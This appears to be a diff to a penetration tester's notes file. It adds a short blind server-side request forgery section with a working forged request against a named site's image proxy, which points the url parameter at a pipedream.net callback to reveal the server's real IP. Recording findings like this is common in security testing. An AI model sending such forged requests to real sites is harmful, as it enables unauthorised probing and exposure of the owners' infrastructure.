@@ -299,3 +299,18 @@ Need to search directories in /api
 Sometimes User API and Admin API can be same.
 
 jsleak is an easy-to-use command-line tool designed to uncover secrets and links in JavaScript files or source code.
+____________________________________________________________________________________________________________________________________________
+Blined SSRF 
+-----------
+
+makro.myfreesites.net -----> google image
+(request)
+
+https://makro2024.myfreesites.net/s/cdn/v1.0/i/m?url=https%3A%2F%2Fstorage.googleapis.com%2Fproduction-sitebuilder-v1-0-5%2F075%2F1713075%2FlW9I0TFj%2F8bc47c7e512c406b835e72513ca5e297&methods=resize%2C500%2C5000
+
+makro.myfreesites.net ------> our IP or pipedreams.net
+(forged request)
+
+https://makro2024.myfreesites.net/s/cdn/v1.0/i/m?url=https://eotblbpp2cc5exq.m.pipedream.net&methods=resize%2C500%2C5000
+
+Finally, we can see REAL webserver IP and RFI is in url parameter.
